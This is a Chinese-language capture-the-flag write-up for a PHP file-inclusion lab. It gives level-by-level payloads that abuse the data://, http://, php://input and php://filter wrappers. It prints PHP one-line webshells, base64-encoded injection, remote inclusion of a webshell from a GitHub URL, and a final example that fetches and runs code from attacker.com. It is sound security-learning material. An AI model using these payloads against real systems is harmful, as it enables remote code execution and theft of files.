## L3:DATA协议，但过滤特殊符号

data协议还有另一种用法，就是可以进行加密处理  
代码中只过滤了特殊符号，所以我们可以使用加密完成操作。  
只要木马注入成功，我们就绕过了文件内容检测，于是实现了RCE

```
<?php eval($_POST['1']);?>    //一句话木马
?wrappers=;base64,PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4
1=hell=system('cat /flag');
```

![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743151208267-0cf2b0a9-4063-403d-b710-33d7d3550824.png)

## L4:http://协议

可以通过常规URL格式来实现文件访问，本来想自己构造一个木马文件，但是题目有后门，就不需要那么麻烦了，

```
?wrappers=127.0.0.1/backdoor.txt
ctf=system('cat /flag');
```

![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743152160882-802ac1ae-d4d3-43a7-91cb-aa9f530787e4.png)

## L5:http://协议，但没有后门文件

通过访问远端木马文件即可完成RCE,

```
?wrappers=raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI
a=system('cat /flag');
```

## L6:php协议_Demo

方法一：用php://filter，使用HB自带的LFI即可，之后进行base64解码

![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743205722230-97352bb0-73f4-4591-aa15-27bb82d9a339.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743205749408-5f945776-9e5d-4dc1-9dbd-1be53b9e023b.png)![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743205789827-de9a98ee-bf43-4fb6-b60f-53106ba42d2f.png)

方法二：用php://input
## L7:php:input协议

法一：第一个想法是利用php://读POST数据的特性，构造RCE，抓包，修改为POST包，添加包内容,传入一个参数执行RCE，失败。发现是我没用绕过第一步的检测，但最终还是没显示出flag

```
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php eval($_GET['']);?>
```

![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743208807342-9a05ffa0-f085-4bf6-a009-3a4dabd8a2a1.png)

法二：构造如图的包，姿势不同，主要使用了highlight_file（）来读取文件内容

![](https://cdn.nlark.com/yuque/0/2025/png/42695688/1743208578126-9297a69f-4319-4e4f-b503-7a14d8268436.png)

## L8:php://filter协议

直接使用HB自带的LFI即可拿下

```
?wrappers=filter/convert.base64-encode/resource=/flag
```

## L9:php://filter协议

和上题一模一样的Payload

```
?wrappers=filter/convert.base64-encode/resource=/flag
```

## L10:文件系统函数file_get_contens()

由于file_get_contens函数支持各种封装协议，我们使用HB自带的LFI即可获得flag

```
?file=php://filter/convert.base64-encode/resource=flag.php

值得注意的是，filter协议中不支持模糊匹配，下面的写法是错误的
?file=php://filter/convert.base64-encode/resource=fla*.???  
```

filter协议有严格的路径要求，所以我们必须知道文件名

那么如何获得文件名呢？

法一：暴力猜常见文件名

法二：如果allow_url_include=on开启，我们可以用php://input直接执行代码

```
GET /vuln.php?file=php://input HTTP/1.1
Host: target.com
Content-Type: text/plain

<?php system("id"); ?>
```

法三;如果allow_url_fopen=on开启，利用文件上传漏洞实现RCE

```
<?php system($_GET["cmd"]); ?>    //假设有个远程地址中含有RCE代码
//发送请求
GET /vuln.php?file=http://attacker.com/evil.txt HTTP/1.1
Host: target.com
//执行命令
GET /vuln.php?file=http://attacker.com/evil.txt&cmd=id HTTP/1.1
```

